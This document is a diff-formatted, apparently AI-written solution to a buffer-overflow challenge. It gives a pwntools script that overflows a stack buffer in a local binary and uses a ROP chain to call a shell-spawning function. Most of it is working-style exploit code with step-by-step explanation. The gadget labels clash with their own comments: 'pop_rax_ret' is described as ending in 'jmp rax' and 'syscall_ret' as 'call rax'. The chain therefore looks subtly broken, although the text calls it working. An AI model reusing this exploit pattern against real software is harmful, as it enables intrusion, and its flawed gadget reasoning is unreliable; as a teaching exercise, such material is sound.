@@ -1,0 +1,88 @@
+To solve this challenge using `pwntools`, we need to exploit the buffer overflow in the `vulnerable_function` and use Return-Oriented Programming (ROP) to call the `callsystem` function, which will spawn a shell. Here are the steps and the corresponding code to achieve this:
+
+### Steps:
+1. **Identify the Buffer Overflow:**
+   - The `vulnerable_function` reads 512 bytes into a 128-byte buffer, causing a stack-based buffer overflow.
+
+2. **Find the Offset:**
+   - Determine the offset at which the return address is overwritten. This can be done using a pattern and checking the crash address.
+
+3. **Find the Gadgets:**
+   - Use the gadgets found by `ROPgadget` to construct the ROP chain. We need to find a gadget to pop a value into `rax` and then call `callsystem`.
+
+4. **Construct the ROP Chain:**
+   - Create a ROP chain to set up the necessary registers and call `callsystem`.
+
+5. **Exploit the Binary:**
+   - Send the crafted payload to the binary using `pwntools`.
+
+### Code:
+
+```python
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.binary = 'rop'
+context.arch = 'amd64'
+
+# Start the process
+p = process('./rop')
+
+# Find the offset to overwrite the return address
+pattern = cyclic(512)
+p.sendline(pattern)
+p.wait()
+
+core = Coredump('./core')
+offset = cyclic_find(core.read(core.rsp, 4))
+print(f'Offset: {offset}')
+
+# Close the process and restart it
+p.close()
+p = process('./rop')
+
+# Addresses
+callsystem = 0x400596
+pop_rax_ret = 0x4004f1  # pop rax; or ah, byte ptr [rax]; jmp rax
+syscall_ret = 0x40058e  # call rax
+
+# Construct the ROP chain
+rop_chain = b''
+rop_chain += p64(pop_rax_ret)
+rop_chain += p64(callsystem)
+rop_chain += p64(syscall_ret)
+
+# Craft the payload
+payload = b'A' * offset + rop_chain
+
+# Send the payload
+p.sendline(payload)
+
+# Pass interaction back to the user
+p.interactive()
+```
+
+### Explanation:
+
+1. **Context Setup:**
+   - `context.binary` and `context.arch` are set to ensure `pwntools` knows the binary and architecture.
+
+2. **Finding the Offset:**
+   - A cyclic pattern is sent to the binary, and a core dump is generated to find the offset where the return address is overwritten.
+
+3. **Restarting the Process:**
+   - The process is closed and restarted after finding the offset.
+
+4. **Addresses:**
+   - The addresses of `callsystem`, `pop_rax_ret`, and `syscall_ret` are defined. These addresses are used to construct the ROP chain.
+
+5. **Constructing the ROP Chain:**
+   - The ROP chain sets `rax` to the address of `callsystem` and then calls `rax` to execute `callsystem`.
+
+6. **Crafting the Payload:**
+   - The payload consists of padding to reach the return address, followed by the ROP chain.
+
+7. **Sending the Payload:**
+   - The payload is sent to the binary, and the interactive shell is passed back to the user.
+
+This should give you a working exploit for the given challenge. Make sure to adjust the offsets and addresses if they differ in your specific environment.
